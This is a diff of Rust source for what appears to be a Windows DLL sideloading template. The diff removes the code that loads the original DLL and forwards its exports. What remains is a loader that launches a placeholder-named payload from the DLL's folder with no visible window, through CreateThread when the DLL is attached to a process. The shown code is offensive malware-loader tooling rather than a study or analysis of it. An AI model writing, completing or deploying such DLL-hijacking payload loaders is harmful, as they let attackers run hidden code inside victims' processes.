@@ -10,22 +10,17 @@ type BOOL = i32;
 type DWORD = u32;
 type HINSTANCE = *mut c_void;
 type LPVOID = *mut c_void;
-type HMODULE = *mut c_void;
-type FARPROC = *const c_void;
 type LPCWSTR = *const u16;
 type LPTHREAD_START_ROUTINE = unsafe extern "system" fn(LPVOID) -> DWORD;
 
 const DLL_PROCESS_ATTACH: DWORD = 1;
 const CREATE_NO_WINDOW: u32 = 0x0800_0000;
-const ORIGINAL_DLL: &str = "__ORIGINAL_DLL__";
 const PAYLOAD_NAME: &str = "__PAYLOAD_NAME__";
 const PAYLOAD_FALLBACK: &str = "__PAYLOAD_FALLBACK__";
 
 #[link(name = "kernel32")]
 extern "system" {
     fn GetModuleFileNameW(h: HINSTANCE, buf: *mut u16, size: DWORD) -> DWORD;
-    fn LoadLibraryW(name: LPCWSTR) -> HMODULE;
-    fn GetProcAddress(h: HMODULE, name: *const u8) -> FARPROC;
     fn CreateThread(
         attr: LPVOID,
         stack: usize,
@@ -38,28 +33,6 @@ extern "system" {
 }
 
 static DLL_DIR: OnceLock<PathBuf> = OnceLock::new();
-static ORIGINAL_HMODULE: OnceLock<usize> = OnceLock::new();
-
-fn to_wide(s: &str) -> Vec<u16> {
-    s.encode_utf16().chain(std::iter::once(0)).collect()
-}
-
-fn original_module() -> HMODULE {
-    let h = *ORIGINAL_HMODULE.get_or_init(|| unsafe {
-        let dir = DLL_DIR.get().cloned().unwrap_or_else(|| PathBuf::from("."));
-        let mut path = PathBuf::from(ORIGINAL_DLL);
-        if !path.is_absolute() {
-            path = dir.join(path);
-        }
-        let w = to_wide(&path.to_string_lossy());
-        LoadLibraryW(w.as_ptr()) as usize
-    });
-    h as HMODULE
-}
-
-unsafe fn resolve(name: &[u8]) -> FARPROC {
-    GetProcAddress(original_module(), name.as_ptr())
-}
 
 fn run_payload(dir: &PathBuf) {
     let local = dir.join(PAYLOAD_NAME);
